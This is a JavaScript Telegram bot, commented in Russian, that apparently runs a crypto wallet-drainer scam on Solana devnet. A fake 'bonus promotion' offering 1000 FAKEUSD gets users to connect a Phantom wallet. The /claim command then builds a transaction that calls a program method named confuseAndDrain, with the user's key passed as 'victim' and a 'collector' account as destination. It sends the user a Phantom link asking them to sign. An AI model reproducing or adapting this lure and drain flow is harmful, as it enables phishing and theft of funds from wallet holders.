import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
import { Connection, PublicKey, Transaction } from '@solana/web3.js';
import { Program, AnchorProvider } from '@coral-xyz/anchor';
import idl from './idl.json' assert { type: 'json' };

dotenv.config();

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const connection = new Connection("https://api.devnet.solana.com", "confirmed");

const PROGRAM_ID = new PublicKey("3zajB2DfuaDc9omwZPhroHzFBZD8RP14DsLBajeWLNmQ");
const FAKE_ACCOUNT = new PublicKey("2RjvZTfQT5v7pDF19KhtTh3xCnMWcvM6W9Upgpi2ZzQP");
const SYSTEM_PROGRAM = new PublicKey("11111111111111111111111111111111");

// Хранилище для связи chatId <-> publicKey
const userWallets = new Map();

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const fullName = `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim();

  const webAppURL = `${process.env.WEBAPP_URL}?userId=${userId}`;

  bot.sendMessage(chatId, `Привет, ${fullName || 'студент'}! Участвуй в бонусной акции:`, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "💸 Получить 1000 FAKEUSD",
            web_app: { url: webAppURL }
          }
        ]
      ]
    }
  });
});

// Обработка данных из Telegram WebApp (получение publicKey)
bot.on('web_app_data', (msg) => {
  try {
    const data = JSON.parse(msg.web_app_data.data);
    if (data.type === 'wallet_connected' && data.publicKey) {
      const chatId = msg.chat.id;
      userWallets.set(chatId, data.publicKey);

      bot.sendMessage(chatId, `Кошелек Phantom подключён: ${data.publicKey}`);
    }
  } catch (err) {
    console.error('Ошибка при разборе web_app_data:', err);
  }
});

// Команда для создания транзакции и отправки ссылки на подпись
bot.onText(/\/claim/, async (msg) => {
  const chatId = msg.chat.id;
  const userPublicKeyStr = userWallets.get(chatId);

  if (!userPublicKeyStr) {
    bot.sendMessage(chatId, "Сначала подключи Phantom Wallet через кнопку бонусной акции.");
    return;
  }

  try {
    const userPublicKey = new PublicKey(userPublicKeyStr);
    const provider = new AnchorProvider(connection, {
      publicKey: userPublicKey,
      signTransaction: async (tx) => tx // не подписываем здесь, подпишет пользователь в Phantom
    }, { preflightCommitment: "confirmed" });

    const program = new Program(idl, PROGRAM_ID, provider);

    const ix = await program.methods
      .confuseAndDrain()
      .accounts({
        victim: userPublicKey,
        collector: PROGRAM_ID,
        fakeAccount: FAKE_ACCOUNT,
        systemProgram: SYSTEM_PROGRAM
      })
      .instruction();

    const tx = new Transaction().add(ix);
    tx.feePayer = userPublicKey;
    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

    const serializedTx = tx.serialize({
      requireAllSignatures: false,
      verifySignatures: false
    });
    const base64Tx = serializedTx.toString('base64');

    const phantomUrl = `https://phantom.app/ul/v1/signTransaction?d=${encodeURIComponent(base64Tx)}&cluster=devnet`;

    bot.sendMessage(chatId, "Подпиши транзакцию в Phantom Wallet:", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "✍️ Подписать транзакцию", url: phantomUrl }]
        ]
      }
    });
  } catch (error) {
    console.error("Ошибка при формировании транзакции:", error);
    bot.sendMessage(chatId, "Произошла ошибка при создании транзакции.");
  }
});
